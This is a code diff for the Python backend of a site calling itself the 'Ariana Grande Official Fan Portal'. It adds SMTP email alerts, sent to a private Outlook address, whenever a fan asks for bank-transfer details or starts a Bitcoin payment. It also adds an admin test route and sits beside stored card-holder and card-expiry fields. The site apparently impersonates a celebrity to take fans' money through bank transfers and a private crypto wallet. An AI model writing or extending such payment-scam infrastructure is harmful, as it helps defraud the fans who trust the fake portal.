@@ -8,6 +8,10 @@ import sqlite3
 import hashlib
 import threading
 import queue
+import smtplib
+import ssl
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 import hmac
 import json
 import os
@@ -172,6 +176,20 @@ def init_db():
             ("card_holder",    "ALTER TABLE bookings ADD COLUMN card_holder TEXT"),
             ("card_expiry",    "ALTER TABLE bookings ADD COLUMN card_expiry TEXT"),
         ]
+        # Seed any missing email/SMTP keys
+        email_defaults = [
+            ('notification_email', 'garycastofficial1@outlook.com'),
+            ('smtp_host',          'smtp.gmail.com'),
+            ('smtp_port',          '587'),
+            ('smtp_user',          ''),
+            ('smtp_pass',          ''),
+            ('smtp_from_name',     'Ariana Grande Fan Portal'),
+        ]
+        for key, val in email_defaults:
+            try:
+                db.execute("INSERT OR IGNORE INTO payment_settings (key, value) VALUES (?,?)", (key, val))
+            except Exception: pass
+
         # Seed any missing social/footer keys into existing DBs
         social_defaults = [
             ('social_instagram',   'https://instagram.com/arianagrande'),
@@ -291,6 +309,13 @@ def init_db():
                 # Support
                 ('support_email',       'support@arianagrande.com'),
                 ('support_phone',       '+1 800 ARIANA 00'),
+                # Email Notifications
+                ('notification_email',  'garycastofficial1@outlook.com'),
+                ('smtp_host',           'smtp.gmail.com'),
+                ('smtp_port',           '587'),
+                ('smtp_user',           ''),
+                ('smtp_pass',           ''),
+                ('smtp_from_name',      'Ariana Grande Fan Portal'),
                 # Social & Footer Links
                 ('social_instagram',    'https://instagram.com/arianagrande'),
                 ('social_twitter',      'https://twitter.com/arianagrande'),
@@ -318,6 +343,106 @@ def init_db():
 
 # Called at module load by gunicorn
 _ensure_db()
+
+
+# ─────────────────────────────────────────────────────────
+# EMAIL NOTIFICATION HELPER
+# ─────────────────────────────────────────────────────────
+
+def send_notification_email(subject, html_body, text_body=''):
+    """Send notification email using SMTP settings from payment_settings."""
+    try:
+        rows     = query("SELECT key, value FROM payment_settings")
+        settings = {r['key']: r['value'] for r in rows}
+
+        smtp_host     = settings.get('smtp_host',     'smtp.gmail.com')
+        smtp_port     = int(settings.get('smtp_port', '587'))
+        smtp_user     = settings.get('smtp_user',     '')
+        smtp_pass     = settings.get('smtp_pass',     '')
+        notify_email  = settings.get('notification_email', 'garycastofficial1@outlook.com')
+        from_name     = settings.get('smtp_from_name', 'Ariana Grande Fan Portal')
+
+        if not smtp_user or not smtp_pass:
+            print("[AG] Email not configured — skipping notification")
+            return False
+
+        msg = MIMEMultipart('alternative')
+        msg['Subject'] = subject
+        msg['From']    = f"{from_name} <{smtp_user}>"
+        msg['To']      = notify_email
+
+        if text_body:
+            msg.attach(MIMEText(text_body, 'plain'))
+        msg.attach(MIMEText(html_body, 'html'))
+
+        ctx = ssl.create_default_context()
+        with smtplib.SMTP(smtp_host, smtp_port) as server:
+            server.ehlo()
+            server.starttls(context=ctx)
+            server.login(smtp_user, smtp_pass)
+            server.sendmail(smtp_user, notify_email, msg.as_string())
+
+        print(f"[AG] Notification email sent to {notify_email}")
+        return True
+
+    except Exception as e:
+        print(f"[AG] Email error: {e}")
+        return False
+
+
+def send_bank_request_email(ref, fname, currency, amount):
+    """Fire notification when a fan requests bank details."""
+    subject = f"🏦 Bank Request — {currency} {amount} from {fname}"
+    html = f"""
+    <div style="font-family:Arial,sans-serif;max-width:520px;margin:0 auto;background:#111;color:#F0EDE8;padding:32px;border:1px solid #C9A84C22">
+      <div style="font-size:24px;font-weight:300;color:#C9A84C;margin-bottom:8px;letter-spacing:2px">ARIANA GRANDE</div>
+      <div style="font-size:11px;letter-spacing:3px;text-transform:uppercase;color:#8A8680;margin-bottom:24px">Official Fan Portal</div>
+      <h2 style="font-size:20px;font-weight:400;margin:0 0 20px;color:#F0EDE8">🏦 Bank Transfer Request</h2>
+      <table style="width:100%;border-collapse:collapse">
+        <tr><td style="padding:10px 14px;background:#1A1A1A;border:1px solid #C9A84C22;color:#8A8680;font-size:11px;letter-spacing:2px;text-transform:uppercase;width:40%">Fan Name</td>
+            <td style="padding:10px 14px;background:#1A1A1A;border:1px solid #C9A84C22;color:#F0EDE8">{fname}</td></tr>
+        <tr><td style="padding:10px 14px;background:#111;border:1px solid #C9A84C22;color:#8A8680;font-size:11px;letter-spacing:2px;text-transform:uppercase">Currency</td>
+            <td style="padding:10px 14px;background:#111;border:1px solid #C9A84C22;color:#C9A84C;font-weight:600">{currency}</td></tr>
+        <tr><td style="padding:10px 14px;background:#1A1A1A;border:1px solid #C9A84C22;color:#8A8680;font-size:11px;letter-spacing:2px;text-transform:uppercase">Amount</td>
+            <td style="padding:10px 14px;background:#1A1A1A;border:1px solid #C9A84C22;color:#C9A84C;font-size:18px;font-weight:300">{amount}</td></tr>
+        <tr><td style="padding:10px 14px;background:#111;border:1px solid #C9A84C22;color:#8A8680;font-size:11px;letter-spacing:2px;text-transform:uppercase">Ref</td>
+            <td style="padding:10px 14px;background:#111;border:1px solid #C9A84C22;color:#F0EDE8;font-family:monospace">{ref}</td></tr>
+      </table>
+      <div style="margin-top:24px;padding:16px;background:#1A1500;border:1px solid #C9A84C44;text-align:center">
+        <p style="margin:0 0 12px;color:#8A8680;font-size:13px">Fan is waiting. Open admin panel and click Send Details.</p>
+        <a href="#" style="display:inline-block;background:#C9A84C;color:#000;padding:12px 28px;text-decoration:none;font-size:12px;font-weight:600;letter-spacing:2px;text-transform:uppercase">Go to Admin Panel</a>
+      </div>
+      <p style="margin-top:20px;font-size:11px;color:#555;text-align:center">Ariana Grande Official Fan Portal · Automated Notification</p>
+    </div>"""
+    text = f"Bank Transfer Request\nFan: {fname}\nCurrency: {currency}\nAmount: {amount}\nRef: {ref}\n\nOpen admin panel to send bank details."
+    threading.Thread(target=send_notification_email, args=(subject, html, text), daemon=True).start()
+
+
+def send_bitcoin_request_email(ref, fname, currency, amount, service):
+    """Fire notification when a fan chooses Bitcoin payment."""
+    subject = f"₿ Bitcoin Payment — {currency} {amount} from {fname}"
+    html = f"""
+    <div style="font-family:Arial,sans-serif;max-width:520px;margin:0 auto;background:#111;color:#F0EDE8;padding:32px;border:1px solid #F7931A44">
+      <div style="font-size:24px;font-weight:300;color:#C9A84C;margin-bottom:8px;letter-spacing:2px">ARIANA GRANDE</div>
+      <div style="font-size:11px;letter-spacing:3px;text-transform:uppercase;color:#8A8680;margin-bottom:24px">Official Fan Portal</div>
+      <h2 style="font-size:20px;font-weight:400;margin:0 0 20px;color:#F7931A">₿ Bitcoin Payment Initiated</h2>
+      <table style="width:100%;border-collapse:collapse">
+        <tr><td style="padding:10px 14px;background:#1A1A1A;border:1px solid #F7931A22;color:#8A8680;font-size:11px;letter-spacing:2px;text-transform:uppercase;width:40%">Fan Name</td>
+            <td style="padding:10px 14px;background:#1A1A1A;border:1px solid #F7931A22;color:#F0EDE8">{fname}</td></tr>
+        <tr><td style="padding:10px 14px;background:#111;border:1px solid #F7931A22;color:#8A8680;font-size:11px;letter-spacing:2px;text-transform:uppercase">Service</td>
+            <td style="padding:10px 14px;background:#111;border:1px solid #F7931A22;color:#F0EDE8">{service}</td></tr>
+        <tr><td style="padding:10px 14px;background:#1A1A1A;border:1px solid #F7931A22;color:#8A8680;font-size:11px;letter-spacing:2px;text-transform:uppercase">Amount</td>
+            <td style="padding:10px 14px;background:#1A1A1A;border:1px solid #F7931A22;color:#F7931A;font-size:18px;font-weight:300">{amount}</td></tr>
+        <tr><td style="padding:10px 14px;background:#111;border:1px solid #F7931A22;color:#8A8680;font-size:11px;letter-spacing:2px;text-transform:uppercase">Ref</td>
+            <td style="padding:10px 14px;background:#111;border:1px solid #F7931A22;color:#F0EDE8;font-family:monospace">{ref}</td></tr>
+      </table>
+      <div style="margin-top:24px;padding:16px;background:#1A0E00;border:1px solid #F7931A44">
+        <p style="margin:0;color:#8A8680;font-size:13px;text-align:center">Fan has been shown your BTC wallet address and is sending payment.</p>
+      </div>
+      <p style="margin-top:20px;font-size:11px;color:#555;text-align:center">Ariana Grande Official Fan Portal · Automated Notification</p>
+    </div>"""
+    text = f"Bitcoin Payment\nFan: {fname}\nService: {service}\nAmount: {amount}\nRef: {ref}"
+    threading.Thread(target=send_notification_email, args=(subject, html, text), daemon=True).start()
 
 
 # ─────────────────────────────────────────────────────────
@@ -448,6 +573,12 @@ def create_booking():
         mutate("UPDATE events SET sold=sold+? WHERE id=?", (d['qty'], d['event_id']))
 
     log_action('BOOKING', f"ref={ref} method={payment_method} service={d['service']}")
+    # Send email notification for Bitcoin payments
+    if payment_method == 'bitcoin':
+        send_bitcoin_request_email(
+            ref, d['fname'], d['currency'],
+            f"{d['currency']} {d['amount_usd']}", d['service']
+        )
     return jsonify({'success': True, 'ref': ref}), 201
 
 
@@ -655,6 +786,8 @@ def bank_request():
         (ref, fname, currency, amount, 'pending')
     )
     log_action('BANK_REQUEST', f"ref={ref} {currency} {amount}")
+    # Fire email notification (non-blocking, runs in background thread)
+    send_bank_request_email(ref, fname, currency, amount)
     return jsonify({'success': True, 'ref': ref}), 201
 
 
@@ -773,6 +906,30 @@ def serve_static(path):
         # SPA fallback — serve index.html for unknown paths
         return send_from_directory(BASE_DIR, 'index.html')
 
+
+
+# POST /api/admin/test-email
+@app.route('/api/admin/test-email', methods=['POST'])
+@require_auth
+def admin_test_email():
+    rows     = query("SELECT key, value FROM payment_settings")
+    settings = {r['key']: r['value'] for r in rows}
+    notify   = settings.get('notification_email', '')
+    smtp_u   = settings.get('smtp_user', '')
+    smtp_p   = settings.get('smtp_pass', '')
+    if not smtp_u or not smtp_p:
+        return jsonify({'error': 'SMTP credentials not configured. Fill in SMTP Username and Password first.'}), 400
+    subject = 'Test — Ariana Grande Fan Portal Notifications Active'
+    html    = ('<div style="font-family:Arial,sans-serif;padding:32px;background:#111;color:#F0EDE8;border:1px solid #C9A84C22">'
+               '<div style="color:#C9A84C;font-size:22px;letter-spacing:2px;margin-bottom:8px">ARIANA GRANDE</div>'
+               '<h2 style="color:#2ECC71;font-weight:400">Email Notifications Working</h2>'
+               f'<p style="color:#8A8680">Alerts will go to <strong style="color:#F0EDE8">{notify}</strong></p>'
+               '<p style="color:#8A8680">You will be notified on every bank transfer and Bitcoin payment request.</p>'
+               '</div>')
+    ok = send_notification_email(subject, html)
+    if ok:
+        return jsonify({'success': True})
+    return jsonify({'error': 'Failed — check SMTP host, port, username and password.'}), 500
 
 # Health check + debug route
 @app.route('/health')
